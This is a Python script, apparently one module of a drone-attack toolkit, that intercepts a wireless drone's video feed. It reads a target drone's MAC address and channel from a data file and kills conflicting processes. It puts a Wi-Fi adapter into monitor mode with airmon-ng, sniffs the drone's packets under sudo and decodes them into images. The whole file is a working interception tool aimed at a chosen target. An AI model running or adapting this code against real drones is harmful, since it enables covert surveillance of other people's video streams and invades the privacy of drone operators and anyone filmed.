import os
import subprocess
import socket
import time
import shutil
import sys
import json
from src.utils import sudo_exec

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")

target_source = target_mac.replace(':','').lower()

options_info = scan_info.get("options", {})
interface = options_info.get("interface")

# Initialize file paths
video_path = os.path.join(os.path.dirname(__file__), '..', '..', 'src', 'video')
tepsotspy_path = os.path.join(video_path, 'tepsots','tepsots.py')
tepsotssh_path = os.path.join(video_path, 'tepsots', 'tepsots.sh')
decoder_path = os.path.join(video_path, 'video_decoder.py')

sniff_output_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'sniff_output.log')

# Check if the file exists
if not os.path.exists(sniff_output_path): # Create the file 
    with open(sniff_output_path, 'w') as file: 
        file.write('') # Write an empty string to create the file 
        print(f'{sniff_output_path} has been created.\n')

image_folder_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'images')

if os.path.exists(image_folder_path): 
    # Clear all contents of the folder 
    for filename in os.listdir(image_folder_path): 
        file_path = os.path.join(image_folder_path, filename) 
        try: 
         if os.path.isfile(file_path) or os.path.islink(file_path): os.unlink(file_path) # Remove file or symbolic link 
         elif os.path.isdir(file_path): 
             shutil.rmtree(file_path)
        except Exception as e: print(f'Failed to delete {file_path}. Reason: {e}')  

##################
## START MODULE ##
##################

# Stop conflicting processes
sudo_exec(f"airmon-ng check kill")

# Start monitor mode
sudo_exec(f"airmon-ng start {interface}")

# Set network adapter channel to that of the target network
sudo_exec(f"{tepsotssh_path} set {target_channel}")

sniff_cmd = ('sudo', 'python3', tepsotspy_path, '-i', interface, '-sa', target_source.replace('\n',''), '-v')
decoder_cmd = ('sudo', 'python3', decoder_path, sniff_output_path, image_folder_path)

sniff_process = None
decoder_process = None

try:
    # Start sniffer and output to log
    with open(sniff_output_path, 'w') as log_file:
        # Start the subprocess and redirect stdout to the log file 
        sniff_process = subprocess.Popen(sniff_cmd, stdout=log_file)

    print("Starting decoder...")
    decoder_process = subprocess.Popen(decoder_cmd)

    print("\n Interceptor is running. Press Ctrl+C to stop.")

    # Wait for decoder process to finish
    decoder_process.wait()

except KeyboardInterrupt:
    print("Shutting down video interceptor...")

except Exception as e:
    print(f"\nAs error occurred: {e}")
    
finally:

    if sniff_process:
        print("Terminating sniffer.")
        sniff_process.terminate()
        sniff_process.wait()

    if decoder_process:
        print("Terminating decoder.")
        decoder_process.terminate()
        decoder_process.wait()
    
    sudo_exec(f"{tepsotssh_path} managed")
    print("Cleanup complete. Exiting video interceptor.")
